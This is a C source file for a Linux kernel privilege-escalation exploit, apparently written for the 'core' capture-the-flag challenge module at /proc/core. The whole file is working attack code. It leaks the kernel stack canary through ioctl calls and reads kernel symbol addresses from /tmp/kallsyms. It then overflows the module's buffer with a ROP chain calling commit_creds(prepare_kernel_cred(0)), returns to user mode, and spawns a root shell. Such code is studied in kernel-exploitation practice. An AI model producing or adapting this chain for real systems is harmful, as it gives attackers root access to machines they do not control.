#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<sys/ioctl.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>

size_t canary;
size_t commit_creds=0;
size_t prepare_kernel_cred=0;
size_t vmlinux_base=0;
// base functions
size_t usr_cs,usr_ss,usr_flag,usr_sp;
// gcc use at&t flavor assembly
void save_status(){
    asm(
        "movq %%cs,%0\n"
        "movq %%ss,%1\n"
        "movq %%rsp,%3\n"
        "pushf\n"
        "pop %2\n"
        :"=r"(usr_cs),"=r"(usr_ss),"=r"(usr_flag),"=r"(usr_sp)
        :
        :"memory"
    );
    printf("usr_cs=%llx,usr_ss=%llx,usr_flag=%llx,usr_sp=%llx.\n",usr_cs,usr_ss,usr_flag,usr_sp);
    puts("[*]status has been saved.\n");
}

void spawn_shell(){
    if(!getuid()){
        system("/bin/sh");
    } else{
        puts("fork shell failed.");
    }
    exit(0);
}

int set_offset(int fd, int off){
    if(!ioctl(fd,0x6677889c,off))
        return 0;
    else
        return -1;
}

int core_read(int fd,char *buf){
    if(!ioctl(fd,0x6677889b,buf))
        return 0;
    else
        return -1;
}
// overflow!shellcode:'a'*0x40+canary+rbx+rip
int core_copy_func(int fd,size_t size){
    if(!ioctl(fd,0x6677889a,size))
        return 0;
    else
        return -1;
}
// leak stack info
size_t rbx=0;
size_t rip=0;
size_t module_base=0;
int leak(int fd,char *buf){
    int offset = 0x40;
    set_offset(fd,offset);
    if(!core_read(fd,buf)){
        //printf("canary:%s",buf);
        canary = *((size_t *)buf);
        rip = *((size_t *)(buf + 0x10));
        module_base = rip - 0x19b;
        rbx = *((size_t *)buf + 0x8);
        printf("canary:%llx\n",*((size_t *)buf));
        printf("rip:%llx\n",*((size_t *)(buf + 0x10)));
        return 0;
    }
    else
        return -1;
} 
//search commit_creds,prepare_kernel_cred
int search(){
    char line[0x100]={0};
    //int fd = open("/tmp/kallsyms",O_RDONLY);
    FILE *fp = fopen("/tmp/kallsyms","r");
    if(fp == NULL){
        printf("open kallsyms failed!");
        return -1;
    }
    while(!feof(fp)){
        fgets(line,0x100,fp);
        //if(strstr(line,"init_sunrpc")){
        if(strstr(line,"commit_creds")){
            char hex[0x18]={0};
            strncpy(hex,line,0x10);
            sscanf(hex,"%llx",&commit_creds);
            vmlinux_base = commit_creds - 0x9c8e0;
        }
        if(strstr(line,"prepare_kernel_cred")){
            char hex[0x18]={0};
            strncpy(hex,line,0x10);
            sscanf(hex,"%llx",&prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
        }
    }
    fclose(fp);
    if(!commit_creds && !prepare_kernel_cred){
        printf("get symbols failed\n");
        return -1;
    }
    printf("commit_creds=%llx\n",commit_creds);
    printf("prepare_kernel_cred=%llx\n",prepare_kernel_cred);
    printf("vmlinux_base=%llx\n",vmlinux_base);
    return 0;
}
            

int main(){
    char buf[0x50]={0};
    size_t payload[0x200]={0};
    size_t raw_vmlinux_base = 0xffffffff81000000;
    size_t base_off = 0;
    save_status();
    int fd = open("/proc/core",O_RDWR);
    if(fd == -1){
        printf("open file failed!\n");
        return -1;
    }
    // leak stack info
    if(leak(fd,buf)){
        printf("leak failed!\n");
        return -1;
    }
    // search symbols
    if(!search()){
        base_off = vmlinux_base - raw_vmlinux_base;
        printf("vmlinux base address offset:%llx\n",base_off);
    }else
        puts("search symbols failed!");
    //layout rop
    int i;
    size_t pop_rdi = vmlinux_base + 0xb2f;
    size_t pop_rdx = vmlinux_base + 0xa0f49;
    size_t mov_rdi_rax_jmp_rdx = vmlinux_base + 0x2396a4;
    size_t swapgs_pop_rbx = 0xd6 + module_base;
    size_t iretq = vmlinux_base + 0x50ac2;
    for(i=0;i<8;i++){
        payload[i] = canary;
    }
    payload[i++] = canary;
    payload[i++] = rbx;
    payload[i++] = pop_rdi;
    payload[i++] = 0;
    payload[i++] = prepare_kernel_cred;
    payload[i++] = pop_rdx;
    payload[i++] = commit_creds;
    payload[i++] = mov_rdi_rax_jmp_rdx;
    payload[i++] = swapgs_pop_rbx;
    payload[i++] = rbx;
    payload[i++] = iretq;
    payload[i++] = spawn_shell;
    payload[i++] = usr_cs;
    payload[i++] = usr_flag;
    payload[i++] = usr_sp;
    payload[i++] = usr_ss;
    
    write(fd,payload,0x100);
    core_copy_func(fd,0xf000000000000000 + 0x100);

        
    return 0;
}
